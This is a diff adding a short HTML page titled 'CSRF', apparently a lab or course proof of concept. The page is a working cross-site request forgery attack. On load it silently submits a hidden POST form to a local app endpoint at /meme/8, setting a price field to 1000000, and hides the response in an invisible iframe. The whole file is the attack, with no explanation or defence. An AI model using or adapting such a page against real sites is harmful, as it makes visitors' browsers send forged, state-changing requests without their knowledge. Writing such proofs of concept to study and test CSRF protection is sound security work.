@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>CSRF</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href='main.css'>
+    <script src='main.js'></script>
+</head>
+<body onload="document.CSRForm.submit()">
+    <form action="http://localhost:3000/meme/8" method="POST" target="hiddenFrame" name="CSRForm">
+        <input type="hidden" name="price" value="1000000"/>
+    </form>
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
+</body>
+</html>
